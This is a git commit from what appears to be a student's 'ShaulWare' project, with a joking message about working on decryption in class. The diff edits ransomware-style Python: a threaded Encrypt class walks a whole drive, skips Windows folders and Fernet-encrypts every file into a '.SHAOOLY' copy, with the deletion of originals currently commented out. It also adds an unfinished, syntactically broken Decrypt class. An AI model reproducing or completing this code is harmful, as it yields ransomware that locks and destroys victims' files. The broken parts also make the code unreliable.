c5830c5232f0a33eaaa78d77a3a6741205bb500d
nickga <shaooly.theking@gmail.com>
2022-02-20 10:39:43 +0200

    I HATE IT HERE jk i love it here
    TO DO: fix the decryption i started but i can't concentrate in class on hard things such as algorithimics in which I am doing here. I wouldn't mine doing tkinter in class because that's copy paste from the internet but i can't do this hard stuff here
    cheers

--- encrypt_the_key.py
+++ encrypt_the_key.py
@@ -3,10 +3,8 @@ import os
 
 counter = 0
 print("If you want all the excel file, for example write .xlsx")
-inp = input("What are you looking for?:> ")
 this_dir = os.getcwd()
-for r, d, f in os.walk(r"C:\Users\shaoo\PycharmProjects\ShaulWare\venv\hello"): # change the hard drive, if you want
-    for file in f:
-        filepath = os.path.join(r, file)
-        print(filepath)
-print(f"trovati {counter} files.")
+for r, d, f in os.walk(r"D:\Users\Student\Desktop\big"): # change the hard drive, if you want
+    print(f'r: {r}')
+    print(f'f: {f}')
+    print(f'd: {d}')
--- main.py
+++ main.py
@@ -5,16 +5,14 @@ from win32 import win32api
 import time
 
 
-
-
 class Encrypt(threading.Thread):
     def __init__(self, key, drive):
         self.key = key
         self.drive = drive
 
     def run(self):
+        start = time.perf_counter()
         for r, d, f in os.walk(self.drive):
-            start = time.time()
             if r.split("\\")[2] != "Windows":
                 for file in f:
                     filepath = os.path.join(r, file)
@@ -23,19 +21,32 @@ class Encrypt(threading.Thread):
                     else:
                         file_extension = file.split(".")[-1]
                     file_name = file.split(".")[0]
-                    enc_file_name = f'{file_name}.SHAOOLY'
+                    enc_file_name = f'{r}\{file_name}.SHAOOLY'
                     fernet = Fernet(self.key)
                     byte_file = open(filepath, 'rb')
                     enc_file_content = fernet.encrypt(byte_file.read())
-                    if not os.path.exists(enc_file_name):
-                        encrypted_file = open(enc_file_name, 'w')
+                    i = 0
+                    while os.path.exists(enc_file_name):
+                        i += 1
+                        enc_file_name = f'{r}{file_name}{i}.SHAOOLY'
+                    encrypted_file = open(enc_file_name, 'w')
                     encrypted_file.write(file_extension + '\n' + enc_file_content.decode())
                     byte_file.close()
-                    os.remove(filepath)
-            end = time.time()
-            print(end - start)
+                    # os.remove(filepath)
+        end = time.perf_counter()
+        print(end - start)
 
 
+class Decrypt(threading.Thread):
+    def __init__(self, key, drive):
+        self.key = key
+        self.drive = drive
+
+    def run(self):
+        start = time.perf_counter()
+        for r, d, f in os.walk(self.drive):
+            for file in f:
+                filepath = os.path.join(r. file)
 
 def decrypt_data(filepath, key):
     filename = filepath.split('/')[-1].split(".")[0]
@@ -52,6 +63,6 @@ def decrypt_data(filepath, key):
 
 
 key = open("key.txt", 'rb').read()
-encrypt = Encrypt(key, r"C:\Users\shaoo\PycharmProjects\ShaulWare\venv\hello")
+encrypt = Encrypt(key, r"D:\Users\Student\Desktop\big")
 encrypt.run()
 print("hello")
